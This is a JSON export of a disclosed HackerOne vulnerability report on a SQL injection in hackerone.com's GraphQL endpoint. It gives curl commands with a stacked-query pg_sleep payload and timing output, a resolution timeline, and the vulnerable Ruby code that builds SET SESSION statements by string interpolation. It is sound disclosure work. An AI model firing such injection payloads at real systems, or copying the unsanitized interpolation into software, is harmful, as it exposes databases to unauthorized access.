{
  "id": 435066,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MzUwNjY=",
  "url": "https://hackerone.com/reports/435066",
  "title": "SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-11-06T16:52:08.233Z",
  "submitted_at": "2018-11-06T16:52:08.233Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jobert",
    "url": "/jobert",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": true,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-11-30T01:26:39.932Z",
  "bug_reporter_agreed_on_going_public_at": "2018-11-30T01:06:03.932Z",
  "team_member_agreed_on_going_public_at": "2018-11-30T01:26:39.843Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection. Execute the following command to reproduce the behavior:\n\n**Locally**:\n```\ncurl -X POST http://localhost:8080/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27\n```\n\n**HackerOne.com**\n```\ncurl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27\n```\n\n**Additional proof**\n```\n$ time curl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(5\\)%3B--%27\n{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total\n$ time curl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(1\\)%3B--%27\n{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total\n$ time curl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(10\\)%3B--%27\n{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total\n```\n\n## Impact\n\nThe SQL injections seems to be executing in the context of the `secure` schema, so impact is currently unknown. However, since an attacker may be able to switch schemas, we should consider this to have a high impact on confidentiality.",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-12-30T01:06:04.055Z",
  "allow_singular_disclosure_after": -161698052.3560391,
  "singular_disclosure_allowed": true,
  "vote_count": 148,
  "voters": [
    "mirchr",
    "taha",
    "derision",
    "ziot",
    "archangel",
    "k1rox4n",
    "mashoud1122",
    "holyfield",
    "bogdantcaciuc",
    "kapytein",
    "and 138 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 10.0,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 3,
    "asset_type": "URL",
    "asset_identifier": "hackerone.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 12272,
      "category": "team",
      "content": "# Summary\nThe `embedded_submission_form_uuid` parameter in the `/graphql` endpoint was vulnerable to a SQL injection. This allowed an attacker to extract information from the public and secure schema. We have determine that the vulnerability was not exploited. A thorough explanation can be found in the report below.\n\n# Timeline\n\n| **Time (PST)**            | **Action**                                                                          |\n|---------------------------|-------------------------------------------------------------------------------------|\n| November 6th, 2018 8:04a  | @tomdev notices a `PG::SyntaxError` exception in hackerone.com's backend ðŸ™Œ           |\n| November 6th, 2018 8:04a  | @jjoos alerted InfoSec, people were assigned tasks                                  |\n| November 6th, 2018 8:20a  | Root cause was identified and a hot fix was put up for review                       |\n| November 6th, 2018 8:52a  | This report was filed to document the vulnerability                          |\n| November 6th, 2018 12:42p | A hot fix for the security vulnerability was released                               |\n| November 15th, 2018 2:20p | Investigation was concluded and determined that the vulnerability was not exploited |\n\n# Impacted Data\nWe have determine that the vulnerability was not exploited. A thorough explanation can be found in the report below.\n\n# Root cause\nHackerOne.com has a GraphQL endpoint that the frontend uses to query its backend. When the embedded submission form feature was introduced, a design decisions was made to leverage a GraphQL parameter rather than an input field. Input fields are properly sanitized. However, GraphQL parameters, were not. These GraphQL parameters were not designed to take raw user input. Here's the vulnerable piece of code:\n\n```ruby\nunless database_parameters_up_to_date\n  safe_query = ''\n\n  new_parameters.each do |key, value|\n    safe_query += \"SET SESSION #{key} TO #{value};\" # <-- ðŸ˜®\n  end\n\n  begin\n    connection.query(safe_query)\n  rescue ActiveRecord::StatementInvalid => e\n    # NOTE: when the transaction is aborted, we cannot set or reset any parameters.\n    # Changes of previous SET statements are undone as well, so we can safely do\n    # nothing here\n    raise e unless e.cause.is_a? PG::InFailedSqlTransaction\n  end\nend\n```\n\nThe reason why we have to pass down these parameters to the PostgreSQL query level, is because HackerOne.com's database has two separate schemas. The `public` schema, which is where all the data resides and what we call the `secure` schema. The latter is a set of derived views from the `public` schema that returns data based on the currently signed in user (or signed out, for that matter). By default, GraphQL queries the `secure` schema. These derived views are automatically generated based on authorization logic we define in our GraphQL layer. This reduces the changes of information disclosure vulnerabilities, such as IDOR and SQL injections. Even when an attacker were to be able to query the `secure` schema, it'd reduce the number of exposed records significantly.",
      "user": {
        "id": 2,
        "username": "jobert",
        "name": "Jobert Abma",
        "bio": "Co-founder of HackerOne. à² _à² ",
        "cleared": true,
        "verified": true,
        "website": "https://hackerone.com",
        "location": "San Francisco, CA",
        "created_at": "2013-03-08T01:17:12.256Z",
        "url": "https://hackerone.com/jobert",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
